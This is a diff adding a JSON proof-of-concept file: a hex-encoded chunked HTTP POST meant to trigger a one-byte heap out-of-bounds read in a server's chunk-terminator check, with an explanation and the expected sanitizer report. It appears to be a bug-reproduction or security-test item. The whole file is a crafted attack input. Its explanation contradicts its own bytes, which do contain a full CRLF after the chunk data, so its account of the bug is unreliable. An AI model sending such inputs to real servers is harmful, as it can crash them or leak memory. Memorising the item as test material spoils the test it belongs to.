@@ -1,0 +1,5 @@
+{
+  "hex_bytes": "50 4f 53 54 20 2f 20 48 54 54 50 2f 31 2e 31 0d 0a 48 6f 73 74 3a 20 6c 6f 63 61 6c 68 6f 73 74 0d 0a 54 72 61 6e 73 66 65 72 2d 45 6e 63 6f 64 69 6e 67 3a 20 63 68 75 6e 6b 65 64 0d 0a 43 6f 6e 74 65 6e 74 2d 54 79 70 65 3a 20 61 70 70 6c 69 63 61 74 69 6f 6e 2f 6f 63 74 65 74 2d 73 74 72 65 61 6d 0d 0a 0d 0a 33 0d 0a 61 62 0d 0d 0a 30 0d 0a 0d 0a",
+  "explanation": "POST / HTTP/1.1\\r\\n: Standard request line. Host: localhost\\r\\n: Required host header. Transfer-Encoding: chunked\\r\\n: Enables chunked processing. Content-Type: application/octet-stream\\r\\n: Required body type. \\r\\n\\r\\n: End of headers. 3\\r\\n: First chunk size (3 bytes). ab\\r: Chunk data (exactly 3 bytes: 'a', 'b', '\\r'). \\r\\n: Attempted CRLF terminator - but only '\\r' is present at buf[i], and buf[i+1] is read OOB. 0\\r\\n\\r\\n: Final chunk to end request.",
+  "expected_effect": "Sanitizer should report a one-byte heap out-of-bounds read at buf[i+1] when processing the chunk terminator, as the buffer length is exactly i+1 (3 bytes of data + '\\r' at position i) but the code attempts to read buf[i+1] for the '\\n' check."
+}
